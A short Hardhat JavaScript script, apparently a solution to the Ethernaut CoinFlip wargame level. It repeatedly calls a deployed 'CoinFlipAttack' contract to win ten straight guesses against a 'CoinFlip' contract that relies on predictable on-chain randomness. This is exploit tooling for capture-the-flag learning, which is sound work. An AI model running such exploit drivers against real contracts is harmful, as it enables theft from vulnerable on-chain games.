const hre = require("hardhat");

async function main() {
  const CoinFlipAddress = "0x3b050246c6A687B98f43ACeEa5B3b1f46423AD7f"
  const CoinFlipAttackAddress = "0x390F80431022c6B84A19493179BD6CD12a465e8e"

  this.coinFlipAttack = await hre.ethers.getContractAt("CoinFlipAttack",CoinFlipAttackAddress);
  this.coinFlip = await hre.ethers.getContractAt("CoinFlip",CoinFlipAddress);
  
  console.log(
    `Times guessed: ${await this.coinFlip.consecutiveWins()}`
  );


  count = 1;
  while(count <= 10) {
    console.log("Guessing the next flip ...");
    const tx = await this.coinFlipAttack.callFlip();

    console.log("Waiting for our guess to be mined :)");
    let txResult = await tx.wait();

    console.log("transaction " , txResult);
    
    console.log(
      `Times guessed: ${await this.coinFlip.consecutiveWins()}`
    );

    count++
  }

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});